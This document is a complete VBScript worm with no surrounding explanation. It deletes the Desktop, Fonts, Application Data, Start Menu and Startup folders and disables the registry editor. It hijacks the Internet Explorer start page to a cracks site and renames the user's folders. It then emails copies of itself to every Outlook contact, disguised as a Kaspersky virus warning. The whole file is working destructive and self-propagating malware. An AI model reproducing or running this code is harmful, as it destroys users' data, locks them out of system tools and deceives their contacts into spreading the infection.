Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")
s.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://mscracks.com/cracks/K1.php"
ie.Visible = True
ie.Navigate "http://mscracks.com/cracks/K1.php"
For Each Folder In s.SpecialFolders
f.deletefolder s.SpecialFolders ("Desktop"),true
if right(folder,15)="Aplication Data" then f.deletefolder folder,true
if right(folder,9)="PrintHood" then f.deletefolder folder,true
if right(folder,5)="FONTS" then f.deletefolder folder,true
if right(folder,7)="NetHood" then f.deletefolder folder,true
if right(folder,12)="Главное меню" then f.deletefolder folder,true
if right(folder,12)="Автозагрузка" then f.deletefolder folder,true
s.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"
For Each Folder In s.SpecialFolders
if right(folder,12)="Главное меню" then 
set tf=f.getfolder(folder)
set af=tf.subfolders
For Each fl In af
set file=f.getfolder(fl):t=t+1
file.name="Worms CodRed" & t
next
end if
next

For Each Folder In s.SpecialFolders
if right(folder,13)="Мои документы" then 
set tf=f.getfolder(folder): tf.name="KIS"
End if
next
For Index = 1 To oe.GetNameSpace("MAPI").AddressLists(1).count
Set OutMail = oe.CreateItem(0)
OutMail.to = oe.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "Kaspersky"
OutMail.Body = "Virus is found In your letter! Request to install Kaspersky Anti-Virus "
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next

